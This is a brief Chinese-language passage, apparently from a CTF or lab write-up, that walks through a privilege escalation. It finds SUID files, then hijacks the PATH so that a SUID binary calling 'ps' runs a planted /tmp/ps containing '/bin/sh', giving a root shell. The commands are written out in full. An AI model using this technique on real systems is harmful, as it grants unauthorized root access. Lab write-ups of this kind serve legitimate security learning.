## 提权

### 环境变量劫持

查找具有 SUID 权限的文件

```bash
find / -type f -perm /4000 2>/dev/null
```

发现有个 `/var/www/backup/procwatch` 文件

![](https://pic1.imgdb.cn/item/69b193d61685501a52dfb9af.png)

运行该文件发现它正在运行了 `ps ` 命令

![](https://pic1.imgdb.cn/item/69b194481685501a52dfba89.png)

修改环境变量

```bash
echo $PATH
export PATH=/tmp:$PATH
```

![](https://pic1.imgdb.cn/item/69b194b51685501a52dfbd6a.png)

新建一个 PS 文件

```bash
echo "/bin/sh" > /tmp/ps
chmod 777 /tmp/ps
```

![](https://pic1.imgdb.cn/item/69b195281685501a52dfc028.png)

最后运行提权成功

![](https://pic1.imgdb.cn/item/69b1964e1685501a52dfc85b.png)
